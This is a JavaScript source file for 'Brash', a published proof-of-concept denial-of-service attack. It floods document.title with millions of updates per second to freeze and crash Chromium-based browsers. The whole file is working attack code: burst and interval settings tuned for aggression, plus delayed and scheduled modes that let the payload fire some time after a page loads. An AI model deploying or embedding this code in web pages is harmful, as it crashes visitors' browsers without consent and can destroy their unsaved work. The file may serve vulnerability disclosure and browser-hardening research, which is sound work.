/**
 * Brash
 * 
 * Exploits the total absence of rate limiting on document.title updates to inject millions
 * of DOM mutations per second, saturating the UI thread, breaking the rendering pipeline,
 * and ultimately crashing Chromium-based browsers.
 * 
 * @author Jose Pino
 * @contact jose@pino.sh (https://x.com/jofpin)
 * @github github.com/jofpin/brash
 * @license MIT
 * 
 * © 2025 Jose Pino | Released: Oct 28, 2025
 */
const Brash = {
    /**
     * Array of pre-generated titles (100 hexadecimal strings of 512 chars each)
     * Pre-loading avoids generation overhead during the attack
     */
    titles: [],
    /**
     * Total counter of document.title updates executed
     */
    counter: 0,
    /**
     * Generates a random 512-character hexadecimal ID
     */
    gid: function() {
        let id = "";
        // Generates 512 hexadecimal characters
        for (let i = 0x0; i < 0x200; i++) {
            id += ((Math.random() * 0x10) | 0x0).toString(0x10);
        }
        return id;
    },
    /**
     * Pre-generates 100 unique titles and stores them in memory
     * This pre-loading enables faster attacks without generation overhead
     */
    gen: function() {
        for (let i = 0x0; i < 0x64; i++) {
            this.titles.push(this.gid());
        }
    },
    /**
     * Injects a burst of 3 sequential document.title updates
     * Each call selects a random title and modifies it 3 times
     * This triple pattern maximizes rendering pipeline thrashing
     */
    inject: function() {
        // Selects a random title from the pre-generated pool
        const t = this.titles[Math.random() * this.titles.length | 0x0];
        
        // Triple-update pattern: causes maximum UI thread thrashing
        for (let i = 0x0; i < 0x3; i++) {
            document.title = t + i;
        }
        
        // Increments counter (3 updates per inject)
        this.counter += 0x3;
    },
    /**
     * Starts the DoS attack with customizable configuration
     * Supports immediate, delayed, or scheduled execution
     * 
     * @param {Object} config - Attack configuration
     * @param {number} [config.burstSize=8000] - Number of injections per cycle (higher = more aggressive)
     * @param {number} [config.interval=1] - Milliseconds between cycles (lower = more aggressive)
     * @param {number|string} [config.delay] - Delay before execution: number in seconds or string ("30s", "5000ms", "3m")
     * @param {string|Date} [config.scheduled] - Specific execution time (ISO string or Date object)
     * 
     * @example
     * // Immediate attack
     * Brash.run({ burstSize: 8000, interval: 1 });
     * 
     * @example
     * // With 30-second delay
     * Brash.run({ burstSize: 8000, interval: 1, delay: 30 });
     * 
     * @example
     * // Scheduled for specific time
     * Brash.run({ burstSize: 8000, interval: 1, scheduled: "2025-10-18T09:30:00" });
     */
    run: function(config) {
        // Default configuration: 8000 bursts every 1ms = ~24M updates/sec
        const burstSize = config.burstSize || config.burst || 8000;
        const interval = config.interval || 1;
        
        /**
         * Internal function that executes the attack
         * Pre-generates titles and launches continuous injection loop
         */
        const execute = () => {
            // Pre-generates the 100 titles before starting the attack
            this.gen();
            
            // Launches infinite injection loop
            setInterval(() => {
                // Executes N injections per cycle (each injection = 3 updates)
                for (let i = 0x0; i < burstSize; i++) {
                    this.inject();
                }
            }, interval);
        };
        
        // MODE 1: Delay - executes after time elapsed since page load
        // Supports: numbers (seconds), "30s", "5000ms", "3m"
        if (config.delay) {
            let ms = 10000; // Default: 10 seconds
            
            // If number: interpret as seconds
            if (typeof config.delay === "number") {
                ms = config.delay * 1000;
            } 
            // If string: parse suffix (ms, s, m)
            else if (typeof config.delay === "string") {
                const val = parseFloat(config.delay);
                if (config.delay.endsWith("ms")) ms = val;
                else if (config.delay.endsWith("s")) ms = val * 1000;
                else if (config.delay.endsWith("m")) ms = val * 60000;
            }
            
            return setTimeout(execute, ms);
        }
        
        // MODE 2: Scheduled - executes at specific moment
        // Supports: ISO string ("2025-10-18T09:30:00") or Date object
        if (config.scheduled) {
            // Converts to timestamp
            const time = config.scheduled instanceof Date ? 
                config.scheduled.getTime() : 
                new Date(config.scheduled).getTime();
            
            // Checks every second if it's time to execute
            const check = setInterval(() => {
                if (Date.now() >= time) {
                    clearInterval(check);
                    execute();
                }
            }, 1000);
            
            return;
        }
        
        // MODE 3: Immediate - executes now (if no delay or scheduled)
        execute();
    }
};